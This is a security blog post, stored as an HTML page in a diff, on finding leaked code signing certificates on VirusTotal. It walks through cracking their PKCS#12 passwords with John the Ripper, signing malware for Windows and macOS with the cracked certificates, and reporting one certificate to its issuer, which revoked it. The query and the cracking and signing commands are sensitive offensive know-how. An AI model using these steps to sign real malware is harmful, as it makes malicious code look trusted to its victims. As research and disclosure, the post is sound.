@@ -1,0 +1,109 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><meta http-equiv="X-UA-Compatible" content="IE=edge" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" href="/css/template.css?version=2.0.1" /><link rel="shortcut icon" href="/img/favicon.svg?version=2.0.1" type="image/svg+xml" /> <script src="/js/template.js?version=2.0.1"></script><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: light)" /><meta name="theme-color" content="#e6e6e6" media="(prefers-color-scheme: dark)" /><title>Finding and utilising leaked code signing certificates</title><meta property="og:title" content="Finding and utilising leaked code signing certificates"><meta name="description" itemprop="description" content="Using services such as GitHub or VirusTotal, it is possible to find leaked code signing certificates. For some, the password can be cracked, after which they can be used to sign malicious code. In this blog post I explain this process, including responsible disclosure measures."><meta property="og:description" content="Using services such as GitHub or VirusTotal, it is possible to find leaked code signing certificates. For some, the password can be cracked, after which they can be used to sign malicious code. In this blog post I explain this process, including responsible disclosure measures."><meta name="keywords" content="leaked, code, signing, certificates, malware"><meta name="language" content="english"><meta name="author" itemprop="creator" content="Tijme Gommers"><meta name="robots" content="index, follow"><meta name="distribution" content="global"><meta name="copyright" content="Copyright © 2024 Tijme Gommers. All rights reserved."><link rel="alternate" type="application/rss+xml" title="Atom" href="/feeds/atom.xml"></head><body><div class="navbar-wrapper mb-4"><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6"><nav class="navbar navbar-expand"><div class="collapse navbar-collapse">
+<ul class="navbar-nav me-auto">
+<li class="nav-item"> <a href="/" target="_self" class="nav-link"> <span>Posts</span> </a>
+</li>
+<li class="nav-item"> <a href="/about/" target="_self" class="nav-link"> <span>About</span> </a>
+</li>
+<li class="nav-item"> <a href="/donate/" target="_self" class="nav-link"> <span>Donate</span> </a>
+</li>
+</ul>
+<ul class="navbar-nav">
+<li class="nav-item"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"></use></svg> </span></span> </a>
+</li>
+<li class="nav-item d-none d-sm-block"> <a href="https://www.linkedin.com/in/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"></use></svg> </span></span> </a>
+</li>
+<li class="nav-item d-none d-sm-block"> <a href="https://github.com/tijme/" target="_blank" rel="noopener noreferrer" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"></use></svg> </span></span> </a>
+</li>
+<li class="nav-item d-none d-sm-block"> <a href="/feeds/atom.xml" target="_blank" class="nav-link"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#rss"></use></svg> </span></span> </a>
+</li>
+</ul>
+</div></nav></div></div></div></div><div class="container"><div class="row justify-content-center"><div class="col-12 col-sm-12 col-md-12 col-lg-11 col-xl-8 col-xll-6">
+<article class="container-fluid"><h1 class="mb-2">Finding and utilising leaked code signing certificates</h1>
+<p class="mb-2 text-muted">Posted on <time datetime="2023-06-07T00:00:00+00:00">7 June 2023</time> by Tijme Gommers.</p>
+<p><strong>[TL;DR]</strong> Using tools such as VirusTotal, it is possible to find leaked code signing certificates. For some, the password can be cracked, after which they can be used to sign malicious code. In this blog post I explain this process, including responsible disclosure measures.</p>
+<hr>
+<p>This blog post consists of 4 chapters. <a href="#1-finding-certificates">Finding</a> leaked certificates, <a href="#2-cracking-pkcs12-passwords">cracking</a> their passwords, using them to <a href="#3-signing-malware">sign malware</a>, and <a href="#4-reporting-leaked-certificates">reporting</a> leaked certificates to certificate authorities.</p>
+<h3 id="1-finding-certificates">1. Finding certificates</h3>
+<p>There are many ways to find code signing certificates online. If you’re lucky, you’ll find one that is still valid. In my journey, I mostly used VirusTotal, but it seems that platforms like <a href="https://grayhatwarfare.com/" target="_blank" rel="noopener noreferrer">Grayhat Warfare</a> and <a href="https://github.com/" target="_blank" rel="noopener noreferrer">GitHub</a> also have many certificates uploaded to them. We’ll use VirusTotal in this blog post.</p>
+<p>With the query below, you can find files with a byte sequence commonly observed in signing certificates. The sequence is often part of ASN.1 DER encoded files (<a href="https://datatracker.ietf.org/doc/html/rfc7292" target="_blank" rel="noopener noreferrer">RFC7292</a>). At offset 4, a version number should be present that always has the value 3. This is denoted by the <code class="language-plaintext highlighter-rouge">02 01 03</code>. The 4<sup>th</sup> byte in the sequence is <code class="language-plaintext highlighter-rouge">30</code>, which represents the start of a new sequence.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content:{02 01 03 30}@4 NOT tag:msi AND NOT tag:peexe
+</code></pre></div></div>
+<p>The results can be downloaded via the VirusTotal GUI or API.</p>
+<p><a href="/img/finding-and-utilising-leaked-code-signing-certificates/search-results-virustotal.png" target="_blank" rel="noopener noreferrer" data-lightbox="finding-certificates" data-title="Search results on VirusTotal"><img src="/img/finding-and-utilising-leaked-code-signing-certificates/search-results-virustotal.png" title="Search results on VirusTotal" alt="Search results on VirusTotal"></a></p>
+<p>I downloaded about 50 certificates that were <a href="https://www.virustotal.com/gui/search/content%253A%257B02%252001%252003%252030%257D%25404%2520NOT%2520tag%253Amsi%2520AND%2520NOT%2520tag%253Apeexe%2520AND%2520ls%253A5d%252B/files" target="_blank" rel="noopener noreferrer">recently uploaded</a> to VirusTotal.</p>
+<h3 id="2-cracking-pkcs12-passwords">2. Cracking PKCS#12 passwords</h3>
+<p>My go-to hash-cracking software is Hashcat. Unfortunately, it does not support cracking PKCS#12 files. John the Ripper <em>does</em> support PKCS#12. First, we need to extract a hash from our PKCS#12 file. This can be done using John’s <code class="language-plaintext highlighter-rouge">pfx2john.py</code> Python script. I made a <a href="https://gist.github.com/tijme/86edd06c636ad06c306111fcec4125ba" target="_blank" rel="noopener noreferrer">few changes</a> to make the script compatible with Python 3.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pfx2john.py certificate.pfx &gt; certificate.hash
+</code></pre></div></div>
+<p>If you’ve generated hashes based on the certificates you found, you can crack them using John with the following arguments. In this example, we use <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as a wordlist.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nt">--format</span><span class="o">=</span>pfx-opencl ./hashes/<span class="k">*</span>
+
+Using default input encoding: UTF-8
+Loaded 13 password hashes with 13 different salts <span class="o">(</span>pfx, <span class="o">(</span>.pfx, .p12<span class="o">)</span> <span class="o">[</span>PKCS#12 PBE <span class="o">(</span>SHA1/SHA2<span class="o">)])</span>
+<span class="nt">--</span> snip <span class="nt">--</span>
+123              <span class="o">(</span>7f61a5a51fe9eef15c9e2ddf03fe10c6.pfx<span class="o">)</span>
+123              <span class="o">(</span>66a9882f1d8463501f7fc89b1a12700b.pfx<span class="o">)</span>
+                 <span class="o">(</span>83bfdbd568b967baf24b7c44935b9a12.pfx<span class="o">)</span>
+<span class="nb">test</span>             <span class="o">(</span>certificate.pfx<span class="o">)</span>
+<span class="nt">--</span> snip <span class="nt">--</span>
+Session completed.</code></pre></figure><blockquote><p><img class="emoji" title=":warning:" alt=":warning:" src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png" height="20" width="20"> If John cannot load your hash, make sure to install the latest version of John from source (to ensure you have PKCS#12 support).</p></blockquote>
+<p>As you can see, some of the hashes got cracked quite easily. The password for the last one is <code class="language-plaintext highlighter-rouge">test</code>. For the cracked certificates, check if they’re trusted and still valid (e.g. not revoked). For the trusted and valid ones, ensure that they have the <code class="language-plaintext highlighter-rouge">Code Signing</code> Object Identifier (OID): <code class="language-plaintext highlighter-rouge">1.3.6.1.5.5.7.3.3</code>. Now hopefully you have one left. You’ll be able to use it to sign malware!</p>
+<p><a href="/img/finding-and-utilising-leaked-code-signing-certificates/extended-key-usage-code-signing.png" target="_blank" rel="noopener noreferrer" data-lightbox="validating-certificates" data-title="Extended Key Usage: Code Signing"><img src="/img/finding-and-utilising-leaked-code-signing-certificates/extended-key-usage-code-signing.png" title="Extended Key Usage: Code Signing" alt="Extended Key Usage: Code Signing"></a></p>
+<p>PS: If you want to use a more extensive password list with John the Ripper, look for one on <a href="https://weakpass.com/wordlist" target="_blank" rel="noopener noreferrer">Weakpass</a>. You could try to use rules and masks as well. I’ve added two examples below for you to get started.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># With rules</span>
+./john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt <span class="nt">--format</span><span class="o">=</span>pfx-opencl ./hashes/<span class="k">*</span> <span class="nt">--rules</span>:OneRuleToRuleThemAll
+
+<span class="c"># With mask</span>
+./john <span class="nt">--mask</span><span class="o">=</span>?1?1?1?1?1?1?1?1?1 <span class="nt">-1</span><span class="o">=[</span>A-z0-9<span class="se">\!\@</span><span class="o">]</span> <span class="nt">--format</span><span class="o">=</span>pfx-opencl ./hashes/<span class="k">*</span> <span class="nt">-min-len</span><span class="o">=</span>1</code></pre></figure><h3 id="3-signing-malware">3. Signing malware</h3>
+<p>If you’ve found and cracked a valid and trusted signing certificate, you can use it to sign malware. I’ll demonstrate signing malware for both Windows and MacOS.</p>
+<p><strong>Windows</strong></p>
+<p>To sign PE files, there is an amazing open source project called <a href="https://github.com/mtrojnar/osslsigncode" target="_blank" rel="noopener noreferrer">osslsigncode</a>. Once installed, run the following command to create a signed version of your malware.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">osslsigncode sign <span class="nt">-pkcs12</span> certificate.pfx <span class="nt">-pass</span> <span class="nb">test</span> <span class="nt">-in</span> malware.exe <span class="nt">-out</span> signed-malware.exe
+Succeeded</code></pre></figure><p>To verify if the signature is valid and correctly applied, you can use <code class="language-plaintext highlighter-rouge">osslsigncode</code> as well.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">osslsigncode verify signed-autoruns.exe
+
+<span class="nt">--</span> snip <span class="nt">--</span>
+Authenticated attributes:
+    Message digest algorithm: SHA256
+    Message digest: C89F86DBE18BB37C44857F3535E5984DCA783610BDFEBF18F659F5275D8D5236
+    Signing <span class="nb">time</span>: Jun  7 18:49:06 2023 GMT
+    Microsoft Individual Code Signing purpose
+
+<span class="nt">--</span> snip <span class="nt">--</span>
+Signature verification: ok
+
+Number of verified signatures: 1
+Succeeded</code></pre></figure><blockquote><p><img class="emoji" title=":warning:" alt=":warning:" src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png" height="20" width="20"> Please note that in my experience <code class="language-plaintext highlighter-rouge">osslsigncode</code> does not check if a certificate has been revoked.</p></blockquote>
+<p><a href="/img/finding-and-utilising-leaked-code-signing-certificates/signed-malware.png" target="_blank" rel="noopener noreferrer" data-lightbox="signed-malware" data-title="Signed malware"><img src="/img/finding-and-utilising-leaked-code-signing-certificates/signed-malware.png" title="Signed malware" alt="Signed malware"></a></p>
+<p>Finally; enjoy your signed malware!</p>
+<p><strong>MacOS</strong></p>
+<p>If you’re signing an existing (modified) app for MacOS, please first remove the existing signature.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">codesign <span class="nt">--remove-signature</span> malicious.app</code></pre></figure><p>Afterwards, import the signing certificate into your keychain. Right-click it and create a new signing identity. Use a name of your choice.</p>
+<p><a href="/img/finding-and-utilising-leaked-code-signing-certificates/sign-create-identity.png" target="_blank" rel="noopener noreferrer" data-lightbox="signing-malware" data-title="Creating a signing identity"><img src="/img/finding-and-utilising-leaked-code-signing-certificates/sign-create-identity.png" title="Creating a signing identity" alt="Creating a signing identity"></a></p>
+<p>You can now use this identity to sign your malicious app.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">codesign <span class="nt">-s</span> <span class="s2">"your_identity"</span> malicious.app</code></pre></figure><p>To check if everything worked, we verify the signature. If everything is okay, the command will not output anything.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">codesign <span class="nt">--verify</span> malicious.app</code></pre></figure><p>If something is wrong, an error will be shown. This is what the output looks like when, for example, your certificate is revoked.</p>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">codesign <span class="nt">--verify</span> malicious.app
+
+malicious.app: CSSMERR_TP_CERT_REVOKED
+In architecture: x86_64</code></pre></figure><h3 id="4-reporting-leaked-certificates">4. Reporting leaked certificates</h3>
+<p>In the example above, the leaked certificate was issued by Sectigo. Sectigo, and any other certificate authority, provides ways to report abuse, including fraudulent or malicious use of certificates. I mailed Sectigo with the following details of the certificate that I found:</p>
+<ul>
+<li>VirusTotal link (including a link to malware signed by the certificate).</li>
+<li>Password.</li>
+<li>Serial number.</li>
+<li>SHA-256 hash.</li>
+<li>SHA-1 hash.</li>
+</ul>
+<p>8 days later Sectigo stated that, upon continued investigation, they found that the signing certificate was indeed involved in malicious activity and has now been revoked.</p></article><footer class="text-center mt-5 mb-5"><div class="footer-links"> <a href="/"><span>Posts</span></a> <a href="/about/" target="_self"><span>About</span></a> <a href="/donate/" target="_self"><span>Donate</span></a> <a href="/responsible-disclosure/" target="_self"><span>Responsible Disclosure</span></a>
+</div>
+<p class="footer-copyright text-secondary"> Copyright © 2024 Tijme Gommers. All rights reserved.</p>
+<div class="footer-icons">
+<div class="padding"> <a href="https://twitter.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#twitter"></use></svg> </span></span> </a>
+</div>
+<div class="padding"> <a href="https://github.com/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#github"></use></svg> </span></span> </a>
+</div>
+<div class="padding"> <a href="https://www.linkedin.com/in/tijme" target="_blank" rel="noopener nofollow"> <span><span class="icon"> <svg><use xlink:href="/img/icons.svg#linkedin"></use></svg> </span></span> </a>
+</div>
+</div></footer>
+</div></div></div></body></html>
